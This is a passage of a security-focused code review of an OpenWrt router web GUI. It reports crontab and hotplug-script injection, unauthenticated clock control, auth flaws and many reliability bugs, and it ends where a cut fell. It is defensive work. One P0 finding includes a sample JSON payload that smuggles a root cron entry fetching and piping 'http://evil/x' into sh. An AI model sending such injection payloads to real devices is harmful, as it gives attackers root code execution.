---
title: Critical code review — 2026-09-26
date: 2026-09-26
scope: backend (Go), frontend/shared (React/TS), tests/CI/build, docs↔code consistency
method: 5 parallel read-only review lanes + independent verification by the parent agent
status: remediated on fix/critical-review-remediation
---

# Critical code review — 2026-09-26

Full-codebase review of `raydak/travo` at `c22fa1f` (clean working tree). **No files were
modified by this review.**

## Method

Five parallel read-only lanes (`delegate`, fresh context, `stealth/space-bunny-alpha`):

| Lane | Scope |
|---|---|
| `backend-services` | `internal/services` + `internal/uci`, `internal/execx`, `internal/ubus` |
| `backend-platform` | `cmd/server`, `internal/api`, `internal/auth`, `internal/ws`, `internal/store`, `internal/models`, `internal/config` |
| `frontend-shared` | `frontend/src`, `shared/src` |
| `tests-ci-tooling` | `Makefile`, `.github/workflows`, `scripts/`, lint/format config, all `*_test.go` |
| `docs-consistency` | `AGENTS.md`, `CLAUDE.md`, `README.md`, `CONTRIBUTING.md`, `docs/**` vs code |

The parent agent independently re-read the code and re-ran the suites for every P0/P1
finding before including it here. Claims not independently confirmed are marked
**UNCONFIRMED**.

### Measured baseline

| Check | Result |
|---|---|
| `mise exec -- go test ./...` (Go **1.27.1**) | **BUILD FAILURE** — 4 of 11 packages |
| `GOTOOLCHAIN=go1.27.0 go test ./...` | 11/11 pass |
| `go test ./... -count=1 -race` | pass; `internal/api` takes 104 s |
| `golangci-lint run ./...` (v2.13.2) | 0 issues |
| `pnpm lint` | 0 errors, 2 warnings (`react-refresh/only-export-components`) |
| `pnpm test` frontend / shared | 311 pass / 58 pass |
| `pnpm format:check` | **fails — 28 source files unformatted** |
| Go statement coverage | 67.9 %, no threshold enforced anywhere |

---

## P0 — Critical

### 0. Go 1.27.1 breaks the build; CI is green because it pins a different Go

`.mise.toml:5` pins `go = "1.27.1"`. That toolchain's module loader silently drops
`zstd.go` and `zip.go` from `klauspost/compress@v1.20.0/zstd` (34 vs 36 `GoFiles`),
producing:

```
zstd/blockdec.go:143:10: undefined: ErrReservedBlockType
zstd/blockdec.go:146:7:  undefined: debugDecoder
zstd/blockdec.go:147:5:  undefined: printf
```

Reproduced from a clean scratch module. The same files build fine when the directory is
copied out of the module cache and built as a local module, so this is toolchain-side,
not a corrupt cache. `klauspost/compress` v1.19.2 under the same toolchain is fine.

CI is unaffected: `.github/workflows/ci.yml` uses `go-version-file: backend/go.mod`,
which resolves to Go **1.27.0**. Net effect — `make build`, `make test` and `make lint`
are broken for every developer using the documented toolchain, while CI reports green.

**Fix:** pin `go = "1.27.0"` in `.mise.toml` and add an explicit
`toolchain go1.27.0` directive to `backend/go.mod` so the two can never diverge again.

### 1. Crontab injection → root RCE, two endpoints

- `internal/services/system_service.go:409-415` (`SetLEDSchedule`)
- `internal/services/wifi_reconnect.go:154-163` (`SetWiFiSchedule`)
- Handlers: `internal/api/system_handlers.go:232-238`, `internal/api/wifi_handlers.go:438-449`
- Model: `internal/models/system.go:155-159` — `OnTime`/`OffTime` documented as `HH:MM`

Both services do `strings.Split(t, ":")` / `strings.SplitN(t, ":", 2)` and only check
`len(parts) == 2`, then `Sprintf` the halves straight into a crontab line. Neither the
handler nor the service validates the field.

```
{"enabled":true,"off_time":"00:00\n* * * * root /bin/sh -c 'wget -qO- http://evil/x|sh' #","on_time":"07:00"}
```

splits to `["00", "00\n* * * * root … #"]` and yields a second attacker-controlled
crontab entry in `/etc/crontabs/root` (`system_service.go:420`, then cron restart at
`:422`) or `/etc/cron.d/openwrt-gui-wifi-schedule` mode `0644` (`wifi_reconnect.go:161-163`).

`internal/api/validation.go` already has `isValidIPv4`/`isValidPort`/`isValidMTU`/
`isValidHostname`; this path simply never calls anything. Note the same
`SplitN`-and-format pattern appears in `system_service.go:409-420` for the LED schedule
with the same weakness.

**Fix:** one shared `validateHHMM` (`^([01]\d|2[0-3]):([0-5]\d)$`, or `time.Parse("15:04", …)`)
enforced at the handler boundary *and* re-checked inside the service. Reject any input
containing `\n`, `\r` or whitespace.

### 2. Shell injection into a root hotplug script via button name

`internal/services/system_service.go:703` in `buildButtonHotplugScript` (`:693-728`):

```go
fmt.Fprintf(&sb, "  %s)\n", b.Name)
```

`SetButtonActions` (`:596-608`) allowlists `b.Action` but never validates `b.Name`.
The result is written `0755` to `/etc/hotplug.d/button/50-gui-button-actions` and
executed by the procd hotplug handler as **root** on the next physical button press.
A newline in `Name` injects arbitrary shell.

**Fix:** allowlist `Name` against the labels `detectButtonNames()` actually discovers
(`/sys/firmware/devicetree/base/keys/*/label`) and reject anything outside
`[A-Za-z0-9_-]`.

### 3. Unauthenticated clock control; the plausibility gate is self-defeating

- `internal/api/system_handlers.go:314-352` (`SyncTimeHandler`)
- Auth exemption: `internal/auth/auth.go:324`
- Route: `internal/api/router.go:80`

`client_time_ms` is validated only for `> 0` (line 318) and a `skew >= 60s` no-op check
(line 343). There is no clamp to a plausible window. Unauthenticated access is gated by:

```go
if !time.Now().Before(deps.TimeSyncMinPlausible) { return 403 }
```

An attacker posts 1970-01-01, the gate re-opens, and the endpoint stays
unauthenticated-reachable indefinitely (the 3/min rate limit is irrelevant). Two impacts:

1. **Unbounded session lifetime.** `AuthService.validateLifetime` (`auth.go:200-219`)
   falls back to wall-clock `exp` for any `jti` unknown to the registry — i.e. after
   every backend restart. Rewinding the clock keeps those tokens valid past their 24 h
   `defaultTokenTTL` (`auth.go:21`) forever.
2. **Targeted lockout.** Setting a plausible-but-wrong clock (e.g. 2030) permanently
   closes the pre-login recovery path and breaks TLS validation, `hwclock -w`
   (`system_handlers.go:288-294`) and cron.

**Fix:** reject unless `clientTime` is within a bounded window of
`deps.TimeSyncMinPlausible` (e.g. ±30 days), and make the "clock was plausible" state
sticky (persisted flag) rather than re-derived from a clock the attacker can move.

### 4. `wifi up` / `wifi down` in unguarded scheduled and hotplug paths

- `internal/services/wifi_reconnect.go:161-162` — `/etc/cron.d/openwrt-gui-wifi-schedule`
  runs `/sbin/wifi up` and `/sbin/wifi down` on a timer
- `internal/services/system_service.go:712-717` — `ButtonActionWifiToggle` emits
  `wifi down` / `wifi up` from the root hotplug script
- `internal/services/wifi_service.go:28-35` — `ShellWifiReloader.Reload()` runs `wifi up`
  (reachable only when `applier == nil`, i.e. test constructors, but exported and
  documented as "the recommended OpenWrt approach")

`AGENTS.md` forbids scripts and SSH flows running `wifi`/`wifi up`; the documented
exception is *bounded recovery logic*, which the auto-reconnect script in the same file
(`wifi_reconnect.go:53-81`) respects properly with a crash guard plus a fail-count. The
schedule and button paths have neither, and `wifi down` is the classic ath11k/IPQ6018
driver-crash trigger.

**Fix:** route both through UCI writes + the existing `StartApply`/`Confirm` flow, or
document them as explicit exceptions in `docs/architecture.md` §3 and ADR 0002 §6.

---

## P1 — High

### Backend

- **Commit-then-validate in `SetRadioRole`.** `services/wifi_ap.go:209` commits
  `wireless`, then `:212` calls `stageWirelessApply()` → `validateWirelessConsistency()`
  (`wifi_service.go:130-149`), which rejects >1 enabled STA bound to `network=wwan`.
  The bad config is *already committed* when the error returns, so rpcd rollback would
  restore to that same bad config. `SetRadioRole` also never calls
  `disableOtherSTASections` (unlike `Connect`, `wifi_connect.go:115`), and creates a
  default AP with a hard-coded `key: "changeme123"` (`wifi_ap.go:171-176`).
  **Fix:** validate *before* `Commit`; disable other STA sections when creating a new one.

- **`RealUCI.GetSections` discards its error.** `uci/real.go:248-256` returns an empty map
  and `nil` on failure. A failed/timed-out `uci show` is indistinguishable from "no
  sections", so `validateWirelessConsistency` **passes** exactly when the system is
  unhealthy, and every `if err := uci.GetSections(...); err != nil` branch in the
  service layer is dead code. **Fix:** return the error.

- **Staged UCI deltas leak across requests.** The `uci` CLI delta is process-global in
  `/tmp/.uci/<config>/changes`. These paths return after mutating without `Commit` or
  revert: `vpn_service.go:1059-1103` (`ImportWireguardConfig`), `vpn_service.go:1450-1487`
  (`SetSplitTunnel` — leaves a peer with an **empty** `allowed_ips`),
  `wifi_connect.go:36-128` (`Connect`, returns at `:73`), `network_service.go:995-1022`
  (`BlockClient`, returns at `:1000`). A later unrelated `uci commit network` (e.g.
  `SetWanConfig` at `network_service.go:679-701`) commits that garbage.
  **Fix:** snapshot + `uci revert` on every error return after the first `Set`, and
  serialize UCI write sequences.

- **Unguarded live-state mutations.** `RestoreBackup` / `UpgradeFirmware` /
  `FactoryReset` (`system_service.go:458`, `:469-497`, `:499-508`) mutate the device with
  no `/etc/trafo/<feature>-in-progress` guard, contrary to `AGENTS.md`. A power loss
  mid-flash bricks the device with no recovery marker.

- **Raw `exec.Command` bypassing `execx`.** `system_service.go:180` (`poweroff`), `:492`
  (`sysupgrade`), `:504` (`firstboot -y`, run **synchronously inside the HTTP handler**),
  `:507` (`reboot`). `execx`'s own doc comment states "every shell-out in the backend
  must go through one of these helpers with an explicit timeout tier". `firstboot -y` on a
  large overlay can take tens of seconds with no timeout, pinning the handler goroutine.

- **Captive auto-accept bounces the uplink.** `captive_autoaccept.go:339-348` runs
  `ifdown wwan; sleep 2; ifup wwan; sleep 8` inside an HTTP handler: ~10 s of blocking
  sleep, live network mutation with **no crash guard**, all errors discarded, and it runs
  whenever the first page fetch fails **regardless of whether `wwan` is the active
  uplink**. On an ethernet-only or USB-tether setup it bounces an unrelated interface.

- **VPN enable mutates before verifying, with no rollback.** `vpn_service.go:598-643`:
  `setupWireGuardFirewall()` (`:612`) commits + reloads `firewall`; `Commit("network")`
  (`:617`); `enableVpnDNSForwarding()` (`:621`) rewrites `dhcp.@dnsmasq[0].server` to VPN
  resolvers, sets `noresolv=1`, commits, restarts dnsmasq; only then
  `applyAndVerifyWireGuard()` (`:622`). On verification failure it returns at `:623` with
  no teardown — dnsmasq now forwards all LAN DNS to resolvers reachable only through a
  tunnel that is not up, with `noresolv=1` suppressing the normal upstream. No guard file.

- **`FailoverService.SetConfig` is not serialized.** `failover_service.go:147-182` takes
  no lock (the `mu` at `:48` only guards `events`/`lastActive`) across guard write →
  `applyManagedConfig` → `verifyApply` → guard removal, racing a concurrent `SetConfig`
  and the `Start()` monitor (`:98-118`).

- **Failover restore never reloads mwan3.** `failover_service.go:165,172,176` call
  `restoreManagedSections()`, which ends at `:522` with `Commit(mwan3ConfigName)` and no
  `reloadMwan3()`. The running mwan3 keeps the broken partial policy (missing
  `use_policy` members, wrong metrics) until the next reload or reboot, while the user is
  told the save failed.

- **Stale mwan3 interface sections are never cleaned up.**
  `failover_service.go:576` writes an `interface` section named after the raw interface
  name; `deleteManagedSections` (`:524-533`) only removes `travo_*`, `wan`, `wwan` and
  `usbTetherUCIName`, and `backupManagedSections` (`:452-467`) only backs up names in the
  *new* candidate list. A removed or renamed candidate's section survives forever, is
  still health-pinged by mwan3, and cannot be restored away.

- **No HTTP timeouts, and the default body limit breaks firmware/restore.**
  `cmd/server/main.go:115` is `fiber.New(fiber.Config{AppName: "travo"})` — no
  `ReadTimeout`/`WriteTimeout`/`IdleTimeout` (Slowloris; also Fiber's graceful
  `Shutdown` can hang on idle keep-alives). Fiber's default 4 MB `BodyLimit` rejects
  `POST /api/v1/system/firmware/upgrade` (`system_handlers.go:190`) and
  `POST /api/v1/system/restore` (`:137`) — OpenWrt sysupgrade images are routinely larger,
  so those endpoints return 413. CORS defaults to `*` (`main.go:118-122`,
  `config/config.go:37,47-60`).

- **JWT secret falls back to a hard-coded constant.** `auth/file_store.go:29-33`: if
  `rand.Read` fails, `randomSecretHex()` returns `"default-jwt-secret-change-me"`, which is
  persisted to `auth.json` and becomes the HS256 signing key — anyone with the source can
  forge an admin token. A dead duplicate of the same fallback lives in
  `config/config.go:129-135`.

- **`AuthService.passwordHash` is unsynchronised.** `auth.go:315` writes it in
  `ChangePassword` while `Login` (`:98`) and `ChangePassword` (`:305`) read it, with no
  mutex.

- **WebSocket: no session re-validation, unbounded frames, no close on shutdown.**
  `ws/handler.go:13-21` validates the token **once** at upgrade, then blocks on
  `ReadMessage()` with no read deadline, no ping/pong and no `SetReadLimit`. `Hub.Stop()`
  (`ws/hub.go:135-137`) only stops the broadcast ticker and never closes registered
  clients. An already-upgraded socket keeps streaming `system_stats`, `alerts` and
  `network_status` after logout/expiry, and a single multi-GB frame is a cheap OOM on a
  128 MB router.

- **Password change neither revokes sessions nor rotates the token.**
  `api/auth_handlers.go:85-97`, `auth.go:277-317`. Existing JWTs stay valid for the full
  24 h; policy is `len(newPassword) < 6`.

- **Shutdown ordering closes the DB before the HTTP server.** `main.go:390-398`:
  `lifecycle.Stop()` (which does `db.Close()`, `:111-113`) runs *before* `app.Shutdown()`,
  so in-flight handlers hit a closed bbolt handle and the errors are swallowed
  (`store/store.go:39`).

- **`appLifecycle.Stop()` is not idempotent.** `main.go:96-113`; `ws/hub.go:135-137`,
  `services/alert_service.go:148-150`, `services/uptime_tracker.go:55-57`,
  `services/network_event_watcher.go:39,129` all do a bare `close(ch)` with no
  `sync.Once`, unlike `FailoverService`/`BandSwitchingService`/`StatsHistoryService`.

- **Background goroutines outside `appLifecycle`.** `main.go:210, 228, 237, 197` and
  `captive_service.go:129` are untracked; on SIGTERM within the first 30 s a detached
  goroutine may still commit UCI wireless changes. `CaptiveService` has no `Stop()`.

### Frontend

- **The WebSocket never connects after a client-side login.**
  `frontend/src/lib/ws-context.tsx:36-38` returns early when there is no token and
  **schedules no retry**; the provider is mounted at app root wrapping `/login`
  (`App.tsx:27`), and `connect` is a `useCallback([])` referenced from a `[connect]`-dep
  effect (`:82-89`), so it runs exactly once per mount. `login-page.tsx` navigates
  client-side. `connected` therefore stays `false` for the entire session → all live
  dashboard updates are dead.

- **Dashboard topology can freeze permanently.**
  `hooks/use-topology-data.ts:44` uses `staleTime: Infinity`, and the only other
  refresher is a WS `network_status` push (`use-network.ts:42-46`). With the WS down
  (the common case, above) nothing refetches, and `staleTime: Infinity` also suppresses
  `refetchOnWindowFocus`/`refetchOnReconnect`.

- **`NetworkInterface.type` in `shared/` does not match the backend.**
  `shared/src/api/network.ts:10` declares `'wan'|'lan'|'wifi'|'vpn'|'usb'`; the backend
  sets `Type: name` (`network_service.go:592`), so only `"wan"`, `"lan"` and one
  hand-patched `"wifi"` (`:226`) are ever emitted. Consequences: the first disjunct of
  `tetherUp` (`use-topology-data.ts:58`) is dead code; `ethernetUp` reports a
  USB-tethered WAN as Ethernet; `dashboard-page.tsx:352` renders **"Protocol: WAN"**
  instead of `dhcp`/`static`/`pppoe`; `dashboard-page.tsx:399-400` is unreachable.
  The mock fixture (`mocks/data.ts:70-72`) uses a shape the device never sends, which is
  why no test catches it.

- **Logout never revokes the server-side token.** `stores/auth-store.ts:29-32` only clears
  local state. `API_ROUTES.auth.logout` exists (`shared/src/api/routes.ts:5`) and is mocked
  (`mocks/handlers.ts:448`) but is **never called from app code**.

- **Repeater wizard double-applies and has no rollback.**
  `components/wifi/repeater-wizard/use-repeater-wizard.ts:129` and `:136` both call
  `modeMutation.mutateAsync('repeater')` — a second real `uci apply` + confirm + rollback
  window. `handleApply` then runs 4–N sequential mutations with no rollback: if the 2nd
  radio's `setAPMutation` fails, the device is left with a new upstream connection and a
  half-applied AP config, reported only as an error toast.

- **Raw `fetch` bypasses the 401 handler.** `hooks/use-system.ts:203` (`useBackup`),
  `:231` (`useRestore`), `:274` (`useFirmwareUpgrade`). On session expiry the user sees
  "Backup failed" and `handleUnauthorized()` never fires. `response.json()` in the error
  branch (`:239`, `:282`) is unguarded, so an HTML 502 body surfaces as a `SyntaxError`.

- **`confirmWifiApply` retries on terminal errors.** `lib/wifi-apply.ts:14-27` swallows
  400/401/403 and re-POSTs every 1.5 s for 30 s; a 401 triggers ~20 token clears and ~20
  `location.assign('/login')` calls.

- **WS identity / duplicate sockets.** `lib/ws-context.tsx:44,60-66` overwrites
  `wsRef.current` without an identity check in `onopen`/`onclose`. Under React 18
  `StrictMode` (`main.tsx:22`) the stale socket's `onclose` can set `connected = false`
  while the new one is open and schedule a third.

- **Alert race.** `hooks/use-alerts.ts:41-48` writes the zustand store from inside
  `queryFn`, so a refetch started before a WS `alert` frame overwrites the newer list and
  drops the just-delivered alert (while `unreadCount` keeps the increment).

- **Unaborted streams.** `pages/services/use-install-log-stream.ts:40-61` sets
  `startedRef.current = false` on close but never aborts the in-flight NDJSON request, so
  reopening the dialog starts a second stream that interleaves into the same `lines`
  array.

- **Route guard swallows all non-redirect errors.** `router/route-guards.ts:14-22` — a 500
  from `GET /system/setup-complete` renders the protected route as if setup were complete;
  it also re-fetches on every navigation.

- **Unsafely interpolated path segments.** `use-network.ts:277`,
  `API_ROUTES.wifi.deleteSaved/${section}`, `wifi.ap/${section}`,
  `services.install.replace(':id', id)`, `system.sshKeys/${index}` — no
  `encodeURIComponent`.

- **Unvalidated external URL navigation.** `components/wifi/captive-portal-card.tsx:50,271`
  (`window.open(portalUrl, '_blank')`), `pages/services/tailscale-auth-section.tsx:39`,
  `tailscale-section.tsx:91` — no scheme allow-list, no `rel="noopener noreferrer"`.

- **WS token in the query string.** `lib/ws-context.tsx:39-40` →
  `/api/v1/ws?token=<JWT>`, required by `ws/handler.go:33`. Lands in access logs, browser
  history and `Referer`. There is also no `Origin` check on the upgrade.

- **Storage-decoder flush dropped.** `lib/api-client.ts:133-142` never calls
  `decoder.decode()` after the loop ends, so a multi-byte character split across the final
  chunk is lost.

### Build / release

- **Release has no test or lint gate.** `.github/workflows/release.yml:9-26` —
  `build-and-release` has no `needs:`, so a red `main` can still ship a tagged release.

- **Released binaries miss `main.BuildTime`.** `release.yml:64-67` stamps only
  `-X main.Version`; `scripts/build.sh:50` stamps both. Released binaries therefore fall
  back to the hardcoded `minPlausibleFloor = "2025-01-01T00:00:00Z"` (`main.go:36-45`),
  making the unauthenticated time-sync gate weaker on exactly the binaries users run.

- **`packaging/openwrt/Makefile` is dead.** References
  `./files/usr/bin/openwrt-travel-gui`, `./files/etc/init.d/openwrt-travel-gui`,
  `./files/etc/config/openwrt-travel-gui` and a non-existent `./files/www/`, with
  `PKG_NAME:=openwrt-travel-gui` / `PKG_VERSION:=0.1.0`. Nothing in CI exercises it.

- **Local `make package` produces filenames `install.sh` cannot resolve.**
  `scripts/build.sh:29` uses `git describe --tags --always --dirty`, producing e.g.
  `travo_0.2.0-23-g5d2da2a-dirty_aarch64_cortex-a53.tar.gz`, while `install.sh:349-350`
  builds `travo_${VERSION}_${_arch}.tar.gz` from a strict semver.

- **`build.sh` runs `go mod tidy` during a build.** `scripts/build.sh:43`, reached from
  `make build-prod` and `deploy-local.sh:128`. The release workflow deliberately does not.

- **`deploy-local.sh` reports success when the service is down.**
  `scripts/deploy-local.sh:177` always succeeds via `|| true`; `:180-189` only warns when
  `pgrep -f travo` never matches, then prints `OK Done` at `:214`.

- **Deploy disables SSH host-key verification.** `scripts/deploy-local.sh:44` uses
  `StrictHostKeyChecking=no UserKnownHostsFile=/dev/null`; same in all three
  `test/integration/*.sh`.

- **Version drift:** `.mise.toml:10` node `26.8.2` vs CI `24` vs `docker-compose.yml:3`
  `node:24-alpine`; pnpm `11.24.0` vs compose `pnpm@latest`; `air@latest` unpinned in
  `Dockerfile.dev`.

- **Untracked WireGuard private key in the checkout.**
  `test/integration/wireguard-profiles/privado.ams-033.conf` contains a real
  `PrivateKey = …`. Gitignored and unreferenced by any script — a live VPN identity living
  in a working copy. Rotate it.

---

## P2 — Medium

### Backend correctness

| Location | Issue |
|---|---|
| `services/adguard_service.go:122-160` | `refreshEndpointsFromYAML` writes `httpAPIBase`/`yamlDNSPort`/`yamlSourcePath` from concurrent HTTP handlers with **no mutex** (struct at `:96-100` has none). `SetConfig` can read a half-updated combination and write AdGuard's YAML to the wrong path. Same pattern in `AlertService.SetCarrierChecker` (`alert_service.go:95-97`), read from the ticker goroutine. |
| `services/service_manager.go:232,255,276,306,329,351,370` | Write lock held across `pkg.Update()` + `pkg.InstallStream()` with `execx.Package` = 10 min each. `wireguard` (3 packages) can block `ListServices`/`GetServiceStatus` for up to 30 min. |
| `services/adguard_service.go:464-478` | `SetConfig` writes arbitrary user YAML and restarts AdGuard with no validation, no backup and no rollback — while dnsmasq still has `server=127.0.0.1#5353` + `noresolv=1` from `SetDNS(true)`, so all LAN DNS dies with no recovery path. |
| `services/vpn_service.go:1459-1463` | `SetSplitTunnel` with `Mode == "custom"` and empty `Routes` silently falls through to `0.0.0.0/0` — the opposite of what "custom, no routes" means, committed to every peer. |
| `services/vpn_service.go:1038-1058` | `SetKillSwitch(true)` `_ =`-ignores every step including `AddSection`, then commits and reloads anyway. A partial rule with the default `target=ACCEPT` is a no-op "kill switch". |
| `services/vpn_service.go:627` | `ToggleWireguard(false)` unconditionally deletes `firewall.vpn_killswitch` even if the user set it as a standalone policy. |
| `services/usb_tethering_service.go:165` | Hard-codes `firewall.@zone[1]` as the WAN zone. Compare `wifi_service.go:378-406`, which resolves by `opts["name"] == "wan"`. `add_list` and `commit` errors are both discarded, so `Configure` returns `nil` with no firewall plumbing. |
| `services/usb_tethering_service.go:179-190` | `Unconfigure` never `del_list`s `usbtether` from the WAN zone, leaving a dangling reference. |
| `services/captive_service.go:378-418` | `RestoreDNS` discards every step's error, then `_ = os.Remove(guardFile)` deletes the only record of pre-bypass state and returns `nil`. |
| `services/captive_service.go:296-311` | `BypassDNS` proceeds even when `readDHCPDNS()` returns `""`: it deletes the `server` list and sets `noresolv=0`, leaving dnsmasq with no usable upstream. |
| `services/captive_service.go:626-643` | `refreshBypassTimestamp`/`autoRestoreStaleBypass` run without `c.mu` while `BypassDNS`/`RestoreDNS` `O_TRUNC`-write the same JSON. A truncated file then fails to unmarshal — and that path **deletes the guard file** (`:372-375`). |
| `services/wifi_service.go:250-262` | `nextSTASectionName()` returns `"sta0"` on `GetSections` error; the caller then does `AddSection("wireless","sta0","wifi-iface")`, and `uci set` on an existing section **changes its type in place** — silently destroying a saved network. |
| `services/wifi_connect.go:39-40` | `Connect` treats any `findSTASectionBySSID` error as "not found", creating a duplicate profile. |
| `services/sqm_service.go:210-217` | `Apply` gates on `/etc/init.d/sqm enabled`, but `SetConfig` (`:160-205`) never runs `enable`, so `SetConfig(Enabled:true)` + `Apply()` can never succeed. No crash guard, no rollback. |
| `services/band_switching_service.go:100-110` | Only `CheckIntervalSec` is clamped. `DownSwitchThresholdDBm: 200` makes the monitor down-switch on every cooldown expiry forever — a self-inflicted flapping loop writing live wireless config. `PreferredBand` is unvalidated. |
| `services/band_switching_service.go:145-243` | `ticker.Reset` is skipped on the `continue` paths (`:186`, `:196`, `:212`, `:229`); `cooldownSec -= cfg.CheckIntervalSec` mixes the new interval with an old countdown. |
| `services/system_service.go:783-793` | `extractLevel` uses `parts[5]`, assuming a weekday in BusyBox `logread` output. Without it, `entryLevel == ""` for every line and `parseLogOutput` (`:800-806`) applies no filter — `GET /logs?level=err` returns everything. **UNCONFIRMED** at runtime (depends on the target image's `logread` format). |
| `services/system_service.go:449` + `api/system_handlers.go:134,138` | Backup path is `/tmp/backup-<unix>.tar.gz` and the handler `defer os.Remove`s it. Two concurrent backups in the same second → the first deletes the file the second is streaming. |
| `services/system_service.go:118-124` | `UsedBytes = total - free - cached - buffered` with no clamp; can go negative. |
| `services/system_service.go:430-455` | `logread`/`dmesg` fully buffered into memory under a 30 s timeout — tens of MB per request under a hot log loop. |
| `services/system_service.go:279-311` | `SetTimezone`/`SetHostname`/`SetNTPConfig` commit but never apply; the API reports success and the change needs a reboot. No guard files. |
| `services/system_service.go:636-673` | `unmarshalButtonActions` is a hand-rolled JSON parser with an "import cycle" comment that cannot be true. `loadButtonActions` (`:619-625`) discards its error, so a parse failure silently shows "none" while the on-disk script keeps the old behaviour. |
| `services/system_service.go:449`, `network_service.go:1215` | Port-forward IDs use `time.Now().UnixMilli()` — two rules in the same millisecond collide and `DeletePortForward` removes both. |
| `services/failover_service.go:719-737` | `normalizeHealth` cannot express a zero: `if health.FailureInterval > 0` replaces a user-supplied `0` (explicitly permitted at `:397-402`) with the default `5`. |
| `services/failover_service.go:637-649` | `verifyApply` succeeds as soon as **any** enabled candidate appears in `networkStatus.Interfaces` — 3 of 4 misconfigured uplinks verify clean. |
| `services/failover_service.go:671-686` | `reloadMwan3` calls `ApplyAndConfirm(["network","mwan3"])`, which starts an rpcd apply with `rollback:true, timeout:30` and then **immediately confirms** it. The rollback window closes before anything is verified, for a config that re-routes the WAN. Compare the staged `StartApply` → verify → `Confirm` flow at `wifi_service.go:155-172`. |
| `services/uci_apply.go:66-77` | `StartApply` leaks the rpcd session directory on `MkdirAll`/`copyFile` failure. |
| `services/uci_apply.go:57-60, 81-84` | `ApplyAndConfirm` with an empty config list always errors (`StartApply` returns `("", nil)`, `Confirm("")` fails). |
| `services/network_service.go:889,941,1041` | `GetBlockedClients`/`GetDNSEntries`/`GetDHCPReservations` convert the `GetSections` error into an empty list with `nil` error — the UI shows "none" and invites duplicates. Compounded by the `GetSections` bug. |
| `services/network_service.go:972-993` | `KickClient` returns `nil` even if no interface accepted the disassociate. |
| `services/network_service.go:404-416` | `ConnectedSince` treats `dhcp.ipv4leases.expires` as a remaining duration rather than an epoch. **UNCONFIRMED** — needs a device check. |
| `services/system_service.go:835-853` | `AddSSHKey` appends the raw body with `Fprintln`; a newline adds extra `authorized_keys` lines. No format check. |
| `services/data_usage_service.go:281-292` | `AutoConfigureVnstat` always returns `nil` — "vnstat not installed" is indistinguishable from success. |
| `services/data_usage_service.go:171-183` | `ResetInterface` is `--remove --force` then `--add`; if `--add` fails the counters are gone with no backup. |
| `services/alert_service.go:148`, `uptime_tracker.go:60` | `Stop()` is not idempotent (bare `close`) — latent, since `main.go:85-94` calls each once. `Start()` has no `sync.Once`, so a second call spawns a duplicate ticker. |
| `services/wifi_mac.go:50-98` | `SetMACAddress` runs `ip link set <if> down/address/up` **before** `stageWirelessApply()`, with no crash guard and errors ignored; an invalid MAC is committed to `wireless.<sta>.macaddr` and replayed by `mac80211.sh`. |
| `services/wifi_ap.go:300-325` | `SetGuestWifi(false)` only sets `wireless.guest.disabled=1`; `network.guest`, three `firewall.guest_*` sections and the DHCP scope persist and keep 192.168.2.0/24 up. |
| `services/wifi_service.go:373-379` | `ensureNamedSection` does not fix a wrong section type — subsequent `Set`s write meaningless options. |
| `services/captive_service.go:520-560`, `adguard_service.go:359`, `vpn_service.go:663-676` | dnsmasq access hard-codes `dhcp.@dnsmasq[0]`, duplicated three times with three different error policies. |
| `execx/execx.go:74-79` | If `cmd.StderrPipe()` fails, the stdout pipe is never drained or closed (fd leak). |
| `services/adguard_service.go:363` | `strings.Contains(out, "127.0.0.1#53")` also matches `127.0.0.1#5353` — false positive on `GetDNSStatus`. |
| `services/adguard_service.go:374-378` | `SetDNS(false)` deletes the whole `server` list and forces `noresolv=0` regardless of who configured it. |
| `services/wifi_reconnect.go:112-118` | `disableAutoReconnect` discards all errors and returns `nil`; a failed crontab edit leaves `wifi up` running every minute. |
| `services/wifi_reconnect.go:18-30, 124-134` | `GetAutoReconnect`/`GetWiFiSchedule` swallow read and parse errors, returning a zero value. |
| `services/wifi_reconnect.go:94, 113` | `sh -c` with the script path interpolated into a single-quoted `grep -v` pattern — unsafe by construction, currently only reachable with a const. |
| `services/speedtest_service.go:169-172` | `parseFloat` error discarded → `0.0`, degrading to a generic "invalid output". |
| `services/service_manager.go:231-250`, `speedtest_service.go:44-59` | Package installs modify live state (init scripts, `/etc/config`, kernel modules) with no guard file. `service_manager.go:247` discards the post-install hook error. |

### Backend input validation

| Location | Field | Issue |
|---|---|---|
| `api/system_handlers.go:232-238` → `services/system_service.go:410-415` | `on_time`/`off_time` | See P0.1 |
| `api/wifi_handlers.go:438-449` → `services/wifi_reconnect.go:154-163` | `on_time`/`off_time` | See P0.1 |
| `api/system_handlers.go:394-405` → `services/system_service.go:835-850` | `key` | Raw append to `/etc/dropbear/authorized_keys`; newlines inject lines. |
| `api/usb_tethering_handlers.go:26-33` → `services/usb_tethering_service.go:151-157` | `interface` | Passed to `uci set network.usbtether.device=<v>`, **bypassing** the `^[a-zA-Z0-9_]+$` validation `uci.RealUCI` enforces (`uci/real.go:11`). |
| `api/network_handlers.go:512-520` → `services/network_service.go:1250-1268` | `target` | `ping`/`traceroute`/`nslookup` argument — leading `-` parsed as a flag, no rate limit, any internal host probeable. |
| `api/network_handlers.go:570-580` → `services/network_service.go:1357-1368` | `mac`, `iface` | `etherwake -i <iface> <mac>` with no `isValidMAC` (contrast `:346`, which validates). |
| `api/system_handlers.go:78-89` | `hostname` | Non-empty only; `isValidHostname` (`api/validation.go:96-101`) exists but is unused here. |
| `api/data_usage_handlers.go:24-33` → `services/data_usage_service.go:178-190` | `interface` | `vnstat --remove -i <v> --force` with no allowlist. |
| `api/network_handlers.go:490-500` | whole `PortForwardRule` | No validation of proto/ports/target before persisting. |
| `api/captive_handlers.go:27-55` → `services/captive_autoaccept.go:279-330` | `portal_url` | Only checked for non-empty scheme/host; the bind error is discarded (`:32`). Fetched with `InsecureSkipVerify: true`, follows redirects, parses and POSTs forms up to 10 times. SSRF. |
| `api/captcha_handlers.go:32`, `api/vpn_handlers.go:127` | whole body | `_ = c.Bind().Body(...)` — malformed bodies silently treated as empty. |
| `api/errors.go:22-24` | — | `RespondWithServerError` returns raw `err.Error()` at ~70 sites, embedding command output and absolute paths. Several handlers forward it with a **400** (`system_handlers.go:388,401,409,424`; `network_handlers.go:497,519,535`). |

### Tests

- **Zero coverage on safety-critical code:**
  - `services/uci_apply.go` — **3.3 %** (61 stmts). The rpcd apply/rollback/confirm path
    `AGENTS.md` mandates. `uci_apply_test.go` only exercises the `Noop` implementation.
    Untestable as written because `rpcdRunDir`/`etcConfigDir` are package constants.
  - `services/band_switching_service.go` — **0 %** (192 stmts). Auto-moves the client
    between radios; `api/band_switching_handlers_test.go` only checks route wiring.
  - `auth/file_store.go` — **0 %** (32 stmts). The file holding the bcrypt hash and the
